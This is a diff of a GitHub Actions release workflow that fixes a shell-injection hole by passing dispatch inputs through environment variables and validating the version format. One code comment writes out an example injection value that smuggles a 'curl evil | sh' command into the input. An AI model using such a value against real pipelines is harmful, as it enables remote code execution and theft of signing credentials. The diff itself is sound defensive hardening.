@@ -119,6 +119,16 @@ jobs:
       - name: Resolve version + tag
         id: resolve
         shell: bash
+        # `workflow_dispatch` inputs reach the script through the environment,
+        # never through `${{ }}` interpolation into the shell. Interpolation
+        # pastes the raw value into the script text, so an input like
+        # `x"; curl evil | sh; "` would EXECUTE here — and this job carries
+        # `id-token: write` + the `release` environment, i.e. the signing
+        # identity. Dispatch needs repo write, so this is an insider/stolen-
+        # token vector rather than an anonymous one, but the fix is free.
+        env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
+          INPUT_PUBLISH_RELEASE: ${{ github.event.inputs.publish_release }}
         run: |
           set -euo pipefail
           # Grep the [workspace.package] table for the declared version.
@@ -145,9 +155,17 @@ jobs:
             version="${tag#agent-v}"
             is_release=true
           else
-            version="${{ github.event.inputs.version }}"
+            version="${INPUT_VERSION:-}"
+            # Shape-check before the value is used anywhere else. A dispatch
+            # input is attacker-influenced in the insider case above, and the
+            # mismatch check further down compares it to Cargo.toml — which
+            # is a correctness gate, not a syntax one.
+            if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ ]]; then
+              echo "::error::Invalid version input: '${version}' (expected N.N.N or N.N.N-rc.N)"
+              exit 1
+            fi
             tag="agent-v${version}"
-            if [[ "${{ github.event.inputs.publish_release }}" == "true" ]]; then
+            if [[ "${INPUT_PUBLISH_RELEASE:-}" == "true" ]]; then
               is_release=true
             else
               is_release=false
